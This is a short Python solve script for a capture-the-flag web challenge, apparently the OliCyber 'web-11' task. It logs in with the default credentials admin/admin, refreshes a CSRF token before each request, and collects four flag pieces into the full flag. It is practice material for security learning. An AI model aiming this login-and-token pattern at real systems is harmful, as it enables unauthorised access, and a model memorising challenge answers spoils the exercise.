#!/usr/bin/python3
#script made by LunarStone292

import requests as r
from colorama import Fore

flag = "http://web-11.challs.olicyber.it/flag_piece"
login = "http://web-11.challs.olicyber.it/login"
payload = {'username': 'admin', 'password': 'admin'}

def main():
    s = r.Session()
    message = ""
    l = s.post(login, json=payload)
    csrf_token = l.json()['csrf']
    for x in range(4):
        l = s.post(login, json=payload)
        csrf_token = l.json()['csrf']
        f = s.get(flag, params={"csrf": csrf_token, "index": str(x)})
        message += f.json()['flag_piece']
    return message

if __name__ == "__main__":
    message = main()
    print("[" + Fore.GREEN + "+" + Fore.RESET + "]" + Fore.GREEN + " Flag: " + Fore.YELLOW + message + Fore.RESET)
